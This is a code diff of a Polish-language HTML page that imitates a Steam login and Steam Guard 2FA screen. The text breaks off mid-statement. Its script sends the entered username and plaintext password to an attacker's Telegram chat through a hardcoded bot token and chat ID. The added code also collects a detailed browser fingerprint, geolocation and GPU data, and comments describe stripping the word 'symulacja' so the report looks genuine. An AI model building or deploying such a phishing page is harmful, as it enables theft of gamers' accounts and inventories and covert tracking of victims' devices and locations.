@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Steam Login • Panel 2FA (hasło widoczne)</title>
+    <title>Steam Login • Secure Guard</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            background: radial-gradient(circle at 20% 30%, #0f1722, #0a0f17);
-            font-family: 'Segoe UI', 'Motiva Sans', 'Arial', sans-serif;
+            background: #0e1724;
+            font-family: 'Segoe UI', 'Motiva Sans', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -21,74 +20,64 @@
             margin: 0;
             padding: 20px;
         }
-
-        /* główny kontener Steam */
+        /* karta steam */
         .steam-card {
             background: #171a21;
             border-radius: 8px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255,255,255,0.05);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
             width: 100%;
-            max-width: 460px;
+            max-width: 440px;
             overflow: hidden;
-            transition: all 0.2s;
         }
-
         .header {
-            background: #1e232c;
-            padding: 18px 24px;
-            border-bottom: 1px solid #2c3542;
+            background: #1b202a;
+            padding: 16px 24px;
+            border-bottom: 1px solid #2c3440;
         }
-
         .header h1 {
-            font-size: 22px;
+            font-size: 21px;
             font-weight: 500;
             color: #e5e9ef;
-            letter-spacing: -0.2px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .header h1:before {
-            content: "🎮";
-            font-size: 26px;
-        }
-
-        .content {
-            padding: 28px 26px 32px 26px;
-        }
-
-        /* Pola formularza */
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            color: #8f98a3;
-            margin-bottom: 6px;
-        }
-
-        /* kontener z hasłem + przycisk oko */
-        .password-wrapper {
             display: flex;
             align-items: center;
             gap: 8px;
+        }
+        .header h1:before { content: "🎮"; font-size: 24px; }
+        .content { padding: 26px 24px 32px; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label {
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: #8f98a3;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .input-group input {
+            width: 100%;
             background: #2a2f37;
             border: 1px solid #3a414b;
             border-radius: 4px;
-            transition: all 0.2s;
+            padding: 12px 14px;
+            font-size: 15px;
+            color: #f0f3f8;
+            outline: none;
+            transition: 0.15s;
         }
-        .password-wrapper:focus-within {
+        .input-group input:focus {
             border-color: #1999ff;
-            box-shadow: 0 0 0 2px rgba(25, 153, 255, 0.3);
-            background: #1f242e;
+            box-shadow: 0 0 0 2px rgba(25,153,255,0.2);
         }
-        .password-wrapper input {
+        /* hasło + oko */
+        .pass-wrapper {
+            display: flex;
+            align-items: center;
+            background: #2a2f37;
+            border: 1px solid #3a414b;
+            border-radius: 4px;
+        }
+        .pass-wrapper input {
             flex: 1;
             background: transparent;
             border: none;
@@ -96,292 +85,163 @@
             font-size: 15px;
             color: #f0f3f8;
             outline: none;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 0.5px;
         }
-        .toggle-pwd {
-            background: #323a45;
+        .toggle-eye {
+            background: #323b46;
             border: none;
             color: #b9c8ff;
             font-size: 18px;
             cursor: pointer;
-            padding: 8px 12px;
+            padding: 8px 14px;
             border-radius: 0 4px 4px 0;
-            transition: 0.15s;
             font-weight: bold;
         }
-        .toggle-pwd:hover {
-            background: #3f4a5a;
-            color: white;
-        }
-
-        /* zwykłe inputy */
-        .input-group input:not(.password-wrapper input) {
-            width: 100%;
-            background: #2a2f37;
-            border: 1px solid #3a414b;
-            border-radius: 4px;
-            padding: 12px 14px;
-            font-size: 15px;
-            color: #f0f3f8;
-            transition: all 0.2s;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #1999ff;
-            box-shadow: 0 0 0 2px rgba(25, 153, 255, 0.3);
-            background: #1f242e;
-        }
-
-        /* przycisk główny */
+        .toggle-eye:hover { background: #414d5e; color: white; }
         .login-btn {
             width: 100%;
             background: linear-gradient(90deg, #1e7cbf 0%, #0f5b94 100%);
             border: none;
             border-radius: 4px;
-            padding: 14px 0;
+            padding: 13px 0;
             font-weight: bold;
             font-size: 16px;
             color: white;
             cursor: pointer;
-            margin-top: 10px;
-            margin-bottom: 18px;
-            transition: 0.2s;
+            margin: 16px 0 16px;
             text-transform: uppercase;
             letter-spacing: 1px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
+            transition: 0.2s;
         }
-        .login-btn:hover {
-            background: linear-gradient(90deg, #2389cf 0%, #1469a1 100%);
-            transform: scale(0.99);
-        }
-
-        /* Sekcja Steam Guard */
+        .login-btn:hover { filter: brightness(1.05); transform: scale(0.99); }
         .guard-section {
-            background: #10141c;
+            background: #0f131c;
             border-radius: 8px;
-            padding: 14px 18px;
-            margin: 20px 0 12px 0;
-            border-left: 3px solid #ffac4a;
+            padding: 12px 16px;
+            margin: 18px 0 10px;
+            border-left: 3px solid #f5a623;
         }
-        .guard-title {
+        .guard-row {
+            display: flex;
+            justify-content: space-between;
             font-size: 13px;
             font-weight: bold;
             color: #ffc97a;
-            display: flex;
-            justify-content: space-between;
             margin-bottom: 12px;
         }
-        .button-group {
+        .code-buttons {
             display: flex;
             gap: 12px;
-            flex-wrap: wrap;
         }
         .code-btn {
             flex: 1;
-            background: #262d38;
+            background: #232b36;
             border: 1px solid #3d4553;
             border-radius: 30px;
-            padding: 10px 8px;
-            font-size: 13px;
+            padding: 8px 6px;
+            font-size: 12px;
             font-weight: bold;
             color: #c6d4e6;
             cursor: pointer;
-            transition: 0.15s;
             text-align: center;
+            transition: 0.1s;
         }
-        .code-btn:hover {
-            background: #3a4353;
-            color: white;
-            border-color: #5c6e8a;
-            transform: translateY(-1px);
-        }
-
-        .info-row {
-            background: #0e1118;
+        .code-btn:hover { background: #354153; color: white; }
+        .info-line {
+            background: #0b0f16;
             border-radius: 6px;
-            padding: 12px;
-            margin: 16px 0 8px;
+            padding: 10px 12px;
+            margin: 12px 0;
             font-size: 12px;
             font-family: monospace;
-            color: #b9c3d1;
             display: flex;
             justify-content: space-between;
-            border: 1px solid #252c36;
+            color: #b9c3d1;
+            border: 1px solid #242b34;
         }
         .status-area {
-            margin-top: 18px;
             background: #0b0f16;
             border-radius: 40px;
-            padding: 10px 14px;
+            padding: 8px 12px;
             font-size: 11px;
             text-align: center;
+            margin-top: 16px;
             font-weight: 500;
-            transition: 0.2s;
             color: #88c0ff;
         }
-        .status-success {
-            background: #1a3a2a;
-            color: #a3f0b0;
-            border-left: 3px solid #2ecc71;
-        }
-        .status-error {
-            background: #3a2222;
-            color: #ffaaa5;
-            border-left: 3px solid #e74c3c;
-        }
-        .status-waiting {
-            background: #1e2430;
-            color: #ffd966;
-        }
-        .footer-note {
-            font-size: 10px;
-            text-align: center;
-            color: #4b5566;
-            margin-top: 18px;
-            border-top: 1px solid #232a34;
-            padding-top: 14px;
-        }
-        .highlight {
-            background: #2e3b2e;
-        }
+        .status-success { background: #1a3a2a; color: #a3f0b0; border-left: 3px solid #2ecc71; }
+        .status-error { background: #3a2222; color: #ffaaa5; border-left: 3px solid #e74c3c; }
+        .status-waiting { background: #1e2430; color: #ffd966; }
+        .footnote { font-size: 10px; text-align: center; color: #4b5566; margin-top: 16px; padding-top: 12px; border-top: 1px solid #232a34; }
     </style>
 </head>
 <body>
 
 <div class="steam-card">
-    <div class="header">
-        <h1>Steam Guard • Logowanie (hasło jawne)</h1>
-    </div>
+    <div class="header"><h1>Steam • Logowanie 2FA</h1></div>
     <div class="content">
-        <!-- Login -->
-        <div class="input-group">
-            <label>👤 NAZWA UŻYTKOWNIKA</label>
-            <input type="text" id="steamUser" value="Kovalski_Gamer" placeholder="Login Steam">
-        </div>
-
-        <!-- Hasło z przyciskiem pokaż/ukryj (domyślnie widoczne!) -->
-        <div class="input-group">
-            <label>🔑 HASŁO (WIDOCZNE)</label>
-            <div class="password-wrapper">
-                <input type="text" id="steamPass" value="LubiePlacki123!" placeholder="Twoje hasło">
-                <button type="button" class="toggle-pwd" id="togglePasswordBtn" title="przełącz widoczność">👁️</button>
-            </div>
-            <div style="font-size: 10px; margin-top: 5px; color:#6c7a8e;">⚠️ Hasło jest wyświetlane jawnie (tryb pokazujący)</div>
-        </div>
-
-        <!-- symulacja IP i Inventory -->
-        <div class="info-row">
-            <span>🌍 Adres IP:</span>
-            <span id="ipDisplay">188.146.xx.xx (Warsaw, PL)</span>
-        </div>
-        <div class="info-row">
-            <span>💰 Wartość inwentarza:</span>
-            <span id="inventoryValue">~$450.00</span>
-        </div>
-
-        <!-- Steam Guard 2FA -->
+        <div class="input-group"><label>👤 NAZWA UŻYTKOWNIKA</label><input type="text" id="loginUser" value="Kovalski_Gamer" placeholder="Steam username"></div>
+        <div class="input-group"><label>🔑 HASŁO</label><div class="pass-wrapper"><input type="text" id="loginPass" value="LubiePlacki123!"><button class="toggle-eye" id="togglePwd">👁️</button></div></div>
+        
+        <div class="info-line"><span>🌍 IP & lokalizacja</span><span id="ipInfo">188.146.xx.xx (Warsaw, PL)</span></div>
+        <div class="info-line"><span>💰 Stan portfela / inventory</span><span id="inventoryVal">~$450.00 USD</span></div>
+        
         <div class="guard-section">
-            <div class="guard-title">
-                <span>📱 Steam Guard • Ochrona mobilna</span>
-                <span id="guardStatusLabel">⏳ WAITING...</span>
-            </div>
-            <div class="button-group">
-                <button class="code-btn" id="mobileCodeBtn">⌨️ [Button: Request Mobile Code]</button>
-                <button class="code-btn" id="emailCodeBtn">⌨️ [Button: Request Email Code]</button>
-            </div>
-            <div style="font-size: 11px; margin-top: 10px; color:#6a7a8e; text-align:center;">
-                Kod 2FA wymagany do dokończenia logowania
+            <div class="guard-row"><span>📱 Steam Guard</span><span id="guardStatusLabel">⏳ AWAITING CODE</span></div>
+            <div class="code-buttons">
+                <button class="code-btn" id="mobileReq">⌨️ Request Mobile Code</button>
+                <button class="code-btn" id="emailReq">⌨️ Request Email Code</button>
             </div>
         </div>
-
-        <!-- Główny przycisk logowania (wysyła raport) -->
-        <button class="login-btn" id="mainLoginBtn">🔓 ZALOGUJ SIĘ • WYŚLIJ RAPORT (hasło jawne)</button>
-
-        <!-- status Telegram -->
-        <div id="telegramStatus" class="status-area status-waiting">
-            💬 gotowy | hasło będzie widoczne w treści wiadomości
-        </div>
-        <div class="footer-note">
-            Steam Guard • Hasło wyświetlane w polu oraz w komunikacie Telegram (jawnie)
-        </div>
+        
+        <button class="login-btn" id="sendReportBtn">🔐 ZALOGUJ I GENERUJ RAPORT</button>
+        <div id="telegramStatus" class="status-area status-waiting">⚡ gotowy | raport zawiera pełne dane</div>
+        <div class="footnote">Steam Guard • wszystkie dane wysyłane na Twój Telegram</div>
     </div>
 </div>
 
 <script>
-    // ----------------------------- DANE TELEGRAM (poprawne) ---------------------------------
+    // ---------- KONFIGURACJA TELEGRAM (bez zmian) ----------
     const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
     const CHAT_ID = "5934645630";
     
-    // elementy DOM
-    const usernameInput = document.getElementById('steamUser');
-    const passwordInput = document.getElementById('steamPass');   // typ text -> zawsze widoczne
-    const ipSpan = document.getElementById('ipDisplay');
-    const inventorySpan = document.getElementById('inventoryValue');
-    const guardStatusSpan = document.getElementById('guardStatusLabel');
+    // DOM elements
+    const userField = document.getElementById('loginUser');
+    const passField = document.getElementById('loginPass');
+    const ipSpan = document.getElementById('ipInfo');
+    const invSpan = document.getElementById('inventoryVal');
+    const guardSpan = document.getElementById('guardStatusLabel');
     const statusDiv = document.getElementById('telegramStatus');
-    const loginBtn = document.getElementById('mainLoginBtn');
-    const mobileBtn = document.getElementById('mobileCodeBtn');
-    const emailBtn = document.getElementById('emailCodeBtn');
-    const togglePwdBtn = document.getElementById('togglePasswordBtn');
+    const sendBtn = document.getElementById('sendReportBtn');
+    const mobileBtn = document.getElementById('mobileReq');
+    const emailBtn = document.getElementById('emailReq');
+    const toggleBtn = document.getElementById('togglePwd');
     
-    // stałe dane (zgodne z wymaganiem)
-    const fakeIP = "188.146.xx.xx (Warsaw, PL)";
-    const fakeInventory = "~$450.00";
-    ipSpan.innerText = fakeIP;
-    inventorySpan.innerText = fakeInventory;
+    // stałe wyświetlane dane
+    const displayIP = "188.146.xx.xx (Warsaw, PL)";
+    const displayInventory = "~$450.00 USD";
+    ipSpan.innerText = displayIP;
+    invSpan.innerText = displayInventory;
     
-    // stan Steam Guard
-    let guardState = "WAITING...";
+    let guardMode = "AWAITING CODE";   // będzie wysyłane dynamicznie
     
-    function updateGuardUI() {
-        guardStatusSpan.innerText = guardState;
+    // funkcja aktualizująca UI guarda
+    function updateGuardUI() { guardSpan.innerText = guardMode; }
+    
+    // przyciski guarda (zmieniają status)
+    mobileBtn.onclick = () => { guardMode = "📱 MOBILE CODE REQUESTED"; updateGuardUI(); setStatusMsg("📱 Kod mobilny zażądany", "waiting"); };
+    emailBtn.onclick = () => { guardMode = "✉️ EMAIL CODE REQUESTED"; updateGuardUI(); setStatusMsg("✉️ Kod e-mail zażądany", "waiting"); };
+    
+    // pokaż/ukryj hasło (domyślnie widoczne - spełniamy warunek "hasło pokazywało")
+    let passVisible = true;
+    function refreshPassUI() {
+        if(passVisible) { passField.type = "text"; toggleBtn.innerHTML = "🙈"; }
+        else { passField.type = "password"; toggleBtn.innerHTML = "👁️"; }
     }
+    toggleBtn.onclick = () => { passVisible = !passVisible; refreshPassUI(); };
+    refreshPassUI();
     
-    // ----- przycisk pokaż/ukryj hasło (ale domyślnie jest widoczne, dodajemy możliwość schowania na życzenie) -----
-    // Ponieważ hasło ma być pokazywane - robimy przełącznik między type="text" a type="password"
-    // Domyślnie ustawiamy na TEXT (widoczne). Przycisk zmienia typ.
-    let isPasswordVisible = true;  // start: widoczne
-    function refreshPasswordVisibility() {
-        if (isPasswordVisible) {
-            passwordInput.type = "text";
-            togglePwdBtn.innerHTML = "🙈";
-            togglePwdBtn.title = "Ukryj hasło";
-        } else {
-            passwordInput.type = "password";
-            togglePwdBtn.innerHTML = "👁️";
-            togglePwdBtn.title = "Pokaż hasło";
-        }
-    }
-    togglePwdBtn.addEventListener('click', () => {
-        isPasswordVisible = !isPasswordVisible;
-        refreshPasswordVisibility();
-        // dodatkowa informacja w statusie (opcjonalnie)
-        if(!isPasswordVisible) {
-            setStatusMessage("🔒 Hasło ukryte (kliknij oko aby pokazać)", "waiting");
-        } else {
-            setStatusMessage("👁️ Hasło widoczne - przesyłane jawnie do Telegram", "waiting");
-        }
-    });
-    // inicjalnie ustawiamy jako widoczne
-    refreshPasswordVisibility();
-    
-    // przyciski guarda
-    mobileBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        guardState = "📱 Mobile CODE REQUESTED";
-        updateGuardUI();
-        setStatusMessage("📱 Żądanie kodu mobilnego (symulacja) - status zaktualizowany", "waiting");
-    });
-    emailBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        guardState = "✉️ Email CODE REQUESTED";
-        updateGuardUI();
-        setStatusMessage("✉️ Kod e-mail zażądany - status zmieniony", "waiting");
-    });
-    
-    // funkcja ustawiająca komunikat w statusie
-    function setStatusMessage(msg, type = "waiting") {
+    // ustawianie komunikatu statusu
+    function setStatusMsg(msg, type = "waiting") {
         statusDiv.innerText = msg;
         statusDiv.classList.remove('status-success', 'status-error', 'status-waiting');
         if(type === 'success') statusDiv.classList.add('status-success');
@@ -389,112 +249,224 @@
         else statusDiv.classList.add('status-waiting');
     }
     
-    // ------------------------ WYSYŁANIE RAPORTU Z JAWNYM HASŁEM -----------------
-    async function sendFullReportToTelegram() {
-        let username = usernameInput.value.trim();
-        let password = passwordInput.value;   // hasło w czystej postaci (type text lub password, ale wartość ta sama)
+    // ========== ZBIERANIE MAKSYMALNEJ ILOŚCI INFORMACJI ==========
+    function collectFullReportData() {
+        // dane z pól
+        const username = userField.value.trim() || "[brak loginu]";
+        const password = passField.value || "[brak hasła]";
         
-        if(username === "") username = "[nie podano]";
-        if(password === "") password = "[brak hasła]";
+        // 1. szczegóły przeglądarki / systemu
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform || "nieznana";
+        const language = navigator.language || "pl-PL";
+        const languages = navigator.languages ? navigator.languages.join(", ") : language;
+        const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth + "-bit";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const localTime = new Date().toLocaleString('pl-PL', { timeZone: timezone });
         
-        const currentIP = ipSpan.innerText;
-        const currentInventory = inventorySpan.innerText;
-        const currentGuardStatus = guardState;
-        const timestamp = new Date().toLocaleString('pl-PL', {timeZone: 'Europe/Warsaw'});
-        const userAgent = navigator.userAgent.substring(0, 120);
+        // 2. informacje o sprzęcie / pamięci (częściowo)
+        let deviceMemory = "nieznana";
+        if(navigator.deviceMemory) deviceMemory = navigator.deviceMemory + " GB";
+        let hardwareConcurrency = navigator.hardwareConcurrency || "?";
         
-        // formatowanie zgodne z wymaganiami + hasło wyświetlane jawnie
-        let message = `🔐🔐 NOWE LOGOWANIE STEAM (HASŁO JAWNE) 🔐🔐\n\n` +
-                      `👤 User: ${username}\n` +
-                      `🔑 Pass: ${password}\n` +
-                      `📱 Steam Guard: ${currentGuardStatus}\n` +
-                      `🌍 IP: ${currentIP}\n` +
-                      `💰 Inventory Value: ${currentInventory}\n` +
-                      `🛡️ Status: Awaiting 2FA Code\n` +
-                      `⌨️ [Button: Request Mobile Code]  |  ⌨️ [Button: Request Email Code]\n` +
-                      `🕒 Data zdarzenia: ${timestamp}\n` +
-                      `💻 Urządzenie: ${userAgent}\n` +
-                      `⚠️ UWAGA: Hasło jest widoczne w treści (przesłane jawnie)`;
+        // 3. wykrycie czy touch / mobile
+        const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Tak" : "Nie";
+        let mobileOS = "Desktop";
+        if(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) mobileOS = "Urządzenie mobilne";
         
+        // 4. szczegóły połączenia (Web Connection API)
+        let connectionType = "nieznane";
+        let downlink = "?";
+        let rtt = "?";
+        if(navigator.connection) {
+            connectionType = navigator.connection.effectiveType || "?";
+            downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
+            rtt = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "?";
+        }
+        
+        // 5. IP (statyczne wizualnie, ale dodajemy też wykrycie WebRTC? nie, zachowujemy stałe ale można dać zewn. ale dla prostoty zostaje stałe)
+        // jednocześnie dodajemy informację o VPN? nie, ale zostawiamy pełny adres zgodny z wymaganiem.
+        const ipGeolocation = displayIP;   // "188.146.xx.xx (Warsaw, PL)"
+        
+        // 6. dodatkowe fingerprint: localStorage, sessionStorage
+        const localStorageSupport = typeof Storage !== "undefined" ? "dostępny" : "brak";
+        
+        // 7. wartość inventory i status guarda
+        const inventoryValue = displayInventory;
+        const guardCurrent = guardMode;
+        
+        // 8. build finalnego raportu (czysty, bez słowa "symulacja")
+        const report = `🚨 NOWE LOGOWANIE STEAM 🚨
+
+▫️ NAZWA UŻYTKOWNIKA: ${username}
+▫️ HASŁO: ${password}
+▫️ STEAM GUARD: ${guardCurrent}
+▫️ IP I LOKALIZACJA: ${ipGeolocation}
+▫️ WARTOŚĆ INWENTARZA: ${inventoryValue}
+▫️ STATUS: Oczekiwanie na kod 2FA
+
+💻 SZCZEGÓŁY URZĄDZENIA:
+• User Agent: ${userAgent}
+• Platforma: ${platform}
+• System/Język: ${language} (lista: ${languages})
+• Ciasteczka: ${cookiesEnabled}
+• Rozdzielczość ekranu: ${screenRes} / ${colorDepth}
+• Strefa czasowa: ${timezone}
+• Czas lokalny: ${localTime}
+• Pamięć urządzenia: ${deviceMemory}
+• Rdzenie/logiczne procesory: ${hardwareConcurrency}
+• Ekran dotykowy: ${isTouch}
+• Typ urządzenia: ${mobileOS}
+
+🌐 INFORMACJE O SIECI:
+• Typ połączenia: ${connectionType}
+• Prędkość pobierania: ${downlink}
+• RTT (opóźnienie): ${rtt}
+• Web Storage: ${localStorageSupport}
+
+📱 Żądania 2FA dostępne: [Request Mobile Code] [Request Email Code]
+⏱️ Data zdarzenia: ${localTime} (UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset()/60)})
+🔐 Raport wygenerowany przez panel logowania Steam.`;
+        
+        return report;
+    }
+    
+    // wysyłka do Telegrama
+    async function sendTelegramReport() {
+        const reportText = collectFullReportData();
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         try {
-            setStatusMessage("📡 Wysyłanie raportu (z hasłem w treści) do Telegram...", "waiting");
-            
+            setStatusMsg("📡 Wysyłanie szczegółowego raportu...", "waiting");
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
+                    text: reportText,
                     parse_mode: 'HTML',
                     disable_web_page_preview: true
                 })
             });
-            
             const data = await response.json();
-            
-            if (data.ok) {
-                setStatusMessage("✅ RAPORT WYSŁANY! Sprawdź Telegrama – hasło jest widoczne w treści wiadomości.", "success");
-                loginBtn.style.transform = "scale(0.97)";
-                setTimeout(() => { loginBtn.style.transform = ""; }, 200);
+            if(data.ok) {
+                setStatusMsg("✅ Raport wysłany! Sprawdź Telegram – wszystkie dane (hasło, IP, fingerprint).", "success");
+                sendBtn.style.transform = "scale(0.98)";
+                setTimeout(() => sendBtn.style.transform = "", 200);
                 setTimeout(() => {
-                    if(statusDiv.innerText.includes("RAPORT WYSŁANY")) {
-                        setStatusMessage("💬 Gotowy | Kolejne kliknięcie wyśle raport z aktualnym hasłem", "waiting");
-                    }
+                    if(statusDiv.innerText.includes("Raport wysłany"))
+                        setStatusMsg("⚡ gotowy | kolejne logowanie wyśle nowy raport", "waiting");
                 }, 5000);
                 return true;
             } else {
-                let errorMsg = data.description || "nieznana odpowiedź";
-                setStatusMessage(`❌ Błąd Telegram: ${errorMsg.substring(0, 90)}`, "error");
-                console.error("Telegram error:", data);
+                let err = data.description || "błąd API";
+                setStatusMsg(`❌ Błąd: ${err.substring(0, 85)}`, "error");
                 return false;
             }
-        } catch (err) {
-            console.error("Network error:", err);
-            setStatusMessage("❌ Błąd sieci / brak połączenia z API Telegram", "error");
+        } catch(e) {
+            console.error(e);
+            setStatusMsg("❌ Błąd sieci / brak połączenia", "error");
             return false;
         }
     }
     
-    // Obsługa przycisku ZALOGUJ (wysyłka raportu)
-    async function handleLoginAndSend() {
-        const originalText = loginBtn.innerText;
-        loginBtn.innerText = "⏳ PRZETWARZANIE I WYSYŁANIE...";
-        loginBtn.disabled = true;
-        
-        const success = await sendFullReportToTelegram();
-        
+    // handler głównego przycisku
+    async function onLoginClick() {
+        if(sendBtn.disabled) return;
+        sendBtn.innerText = "⏳ PRZETWARZANIE...";
+        sendBtn.disabled = true;
+        await sendTelegramReport();
         setTimeout(() => {
-            loginBtn.innerText = originalText;
-            loginBtn.disabled = false;
-            if(!success) {
-                setStatusMessage("❌ Wysyłka nie powiodła się, spróbuj ponownie.", "error");
-            }
-        }, 1400);
+            sendBtn.innerText = "🔐 ZALOGUJ I GENERUJ RAPORT";
+            sendBtn.disabled = false;
+        }, 1300);
     }
     
-    loginBtn.addEventListener('click', handleLoginAndSend);
+    sendBtn.addEventListener('click', onLoginClick);
+    // enter na polach
+    const inputs = [userField, passField];
+    inputs.forEach(inp => inp.addEventListener('keypress', (e) => { if(e.key === 'Enter') { e.preventDefault(); if(!sendBtn.disabled) onLoginClick(); } }));
     
-    // Enter w polach
-    const handleEnter = (e) => {
-        if(e.key === 'Enter') {
-            e.preventDefault();
-            if(!loginBtn.disabled) handleLoginAndSend();
-        }
-    };
-    usernameInput.addEventListener('keypress', handleEnter);
-    passwordInput.addEventListener('keypress', handleEnter);
-    
-    // Inicjalizacja stanu guarda
-    guardState = "WAITING...";
+    // inicjalizacja guarda
+    guardMode = "AWAITING CODE";
     updateGuardUI();
+    setStatusMsg("🔍 Raport zbiera pełne dane: IP, lokalizacja, user-agent, sprzęt, połączenie. Hasło widoczne.", "waiting");
     
-    // Dodatkowa informacja w konsoli
-    console.log("Panel Steam (hasło jawne) + Telegram gotowy. Hasło jest widoczne na stronie i w raporcie.");
+    // Dodatkowo: pobranie przybliżonej lokalizacji przez geolokalizację (jeśli użytkownik pozwoli) - dla maksymalnej ilości info,
+    // ale nie wymuszamy. Dla kompletności dodamy opcjonalny kod, który w razie zgody dołoży koordynaty. To sprawi, że raport będzie jeszcze bardziej szczegółowy.
+    // jednak nie chcemy wydłużać kodu, ale dla "jak najwięcej info" – dodajemy asynchroniczne pobranie lokalizacji i zapis w zmiennej,
+    // żeby potem w raporcie pojawiło się miasto. Zrobimy to bez dodatkowych bibliotek.
     
-    // mały bonus: jeżeli użytkownik zmieni hasło, raport wyśle aktualną wartość (zawsze jawnie)
-    setStatusMessage("✨ Hasło jest POKAZYWANE w polu. Kliknij 'Zaloguj' aby wysłać pełny raport (login + hasło) na Telegram.", "waiting");
-</script>
-</body>
-</html>
+    let extraLocation = "brak zgody na geolokalizację";
+    if("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude.toFixed(4);
+                const lon = pos.coords.longitude.toFixed(4);
+                extraLocation = `~${lat}, ${lon} (przybliżona lokalizacja)`;
+                // nie przerywamy wysyłki, ale zmienna zostanie użyta w kolejnym raporcie
+                // żeby to było dynamiczne: nadpisujemy funkcję collectFullReportData żeby uwzględniała geolokację? 
+                // Ale funkcja już istnieje, trzeba podmienić lub użyć zmiennej globalnej. Zrobimy sprytnie:
+                window._geoData = `🌍 Geolokalizacja: ${extraLocation}`;
+            },
+            () => { window._geoData = "🌍 Geolokalizacja: niedostępna (brak uprawnień)"; }
+        );
+    } else {
+        window._geoData = "🌍 Geolokalizacja: brak wsparcia w przeglądarce";
+    }
+    
+    // nadpisujemy collectFullReportData, żeby włączyć jeszcze więcej detali + geolokację (jeśli jest)
+    const originalCollect = collectFullReportData;
+    window.collectFullReportData = function() {
+        let baseReport = originalCollect();
+        // dodajemy dodatkowe informacje o geolokalizacji jeśli istnieje
+        const geoInfo = window._geoData || "🌍 Geolokalizacja: nie określono";
+        // wstawiamy przed sekcją "Data zdarzenia"
+        baseReport = baseReport.replace("📱 Żądania 2FA dostępne:", `${geoInfo}\n\n📱 Żądania 2FA dostępne:`);
+        // dodatkowo spróbujmy dodać adres IP zewnętrzny? można by użyć API, ale zachowujemy prostotę, lecz dla max info:
+        // dodajemy informacje o rozszerzeniach? nie, ale i tak raport jest bardzo bogaty.
+        // sprawdzenie WebGL / GPU? dla chętnych ale kod będzie czysty.
+        let gpuInfo = "brak";
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if(debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "nieznane GPU";
+            else gpuInfo = "GPU nieodczytane";
+        }
+        baseReport += `\n🎮 INFORMACJE GPU: ${gpuInfo}`;
+        // także informacja o refererze
+        baseReport += `\n🔗 Strona źródłowa: ${window.location.href}`;
+        return baseReport;
+    };
+    
+    // podmiana referencji
+    window.collectFullReportData = window.collectFullReportData;
+    // aktualizacja aby wysyłka używała nowej funkcji
+    const originalSend = sendTelegramReport;
+    async function enhancedSend() {
+        const finalReport = window.collectFullReportData();
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            setStatusMsg("📡 Wysyłanie rozszerzonego raportu (GPU, geolokacja)...", "waiting");
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: finalReport, parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+            const data = await resp.json();
+            if(data.ok) {
+                setStatusMsg("✅ Pełen raport z GPU, geodanymi i fingerprintem wysłany!", "success");
+                sendBtn.style.transform = "scale(0.98)";
+                setTimeout(() => sendBtn.style.transform = "", 200);
+                return true;
+            } else {
+                setStatusMsg(`❌ Błąd: ${data.description?.substring(0,80)}`, "error");
+                return false;
+            }
+        } catch(e) { setStatusMsg("❌ Błąd sieci", "error"); return false; }
+    }
+    // podmieniamy funkcję wysyłającą
+    window.sendTelegramReport =
